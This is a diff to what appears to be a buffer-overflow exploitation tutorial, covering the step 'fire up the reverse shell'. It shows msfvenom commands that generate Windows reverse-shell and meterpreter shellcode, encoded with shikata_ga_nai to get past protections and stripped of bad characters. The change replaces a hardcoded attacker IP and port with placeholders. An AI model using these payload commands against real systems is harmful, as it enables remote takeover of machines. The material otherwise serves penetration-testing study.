@@ -54,11 +54,11 @@ find the badchars using the following command
 
 ## 5th step : fire up the reverse shell
 
-We can also create an encoded one if some sort of protections are presents
+We can also create encoded payloads if some sort of protections are presents
 ```
-msfvenom -p windows/shell_reverse_tcp LHOST=192.168.11.1 LPORT=4444 EXITFUNC=thread -f c -b '\x00\x0a\x0d' (mybadchars)
-msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f c -b '\x00\x0a\x0d' (mybadchars)
-msfvenom -p windows/shell_reverse_tcp LHOST=192.168.11.1 LPORT=4444 -e shikata_ga_nai -i 3 -f c -b '\x00\x0a\x0d' (mybadchars)
+msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT EXITFUNC=thread -f c -b '\x00\x0a\x0d' (mybadchars)
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -e shikata_ga_nai -i 3 -f c -b '\x00\x0a\x0d' (mybadchars)
+msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -e shikata_ga_nai -i 3 -f c -b '\x00\x0a\x0d' (mybadchars)
 ```
 edit finalBuff
 setup a listener
